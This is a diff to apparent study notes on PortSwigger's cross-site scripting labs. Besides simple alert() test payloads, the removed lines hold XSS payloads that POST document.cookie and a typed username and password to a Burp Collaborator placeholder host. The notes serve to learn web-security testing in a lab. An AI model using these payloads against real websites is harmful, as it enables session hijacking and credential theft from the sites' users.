@@ -10,36 +10,9 @@ Goal: perform a cross-site scripting attack that calls the `alert` function.
   ?search=<script>alert%28"XSS"%29<%2Fscript>
   ```
 
-  ```
-  <script>alert(document.cookie)</script>
-  <img src=1 onerror=alert(1)>
-  
-  <script>
-  fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
-  method: 'POST',
-  mode: 'no-cors',
-  body:document.cookie
-  });
-  </script>
   
   
-  <input name=username id=username>
-  <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
-  method:'POST',
-  mode: 'no-cors',
-  body:username.value+':'+this.value
-  });">
   
-  
-  <iframe src="https://your-lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
-  
-  
-  https://0a450003049df566c03104d1000d000d.web-security-academy.net/?search=%27%20opo%20po<body%20onresize>p%20%27
-  ```
-
-  
-
-
 
 ---
 
@@ -166,7 +139,7 @@ Goal: submit a comment that calls the `alert` function when the comment author n
 
 - Repeat the process again but this time replace your input with the following payload to inject a JavaScript URL that calls alert:
 
-  ```json
+  ```
   javascript:alert(1)
   ```
 
@@ -663,10 +636,6 @@ Goal: perform a cross-site scripting attack that calls the `alert` function insi
 
 
 ---
-
-### [Reflected XSS in a JavaScript URL with some characters blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked)
-
-Goal:  perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that calls the `alert` function with the string `1337` contained somewhere in the `alert` message.
 
 
 
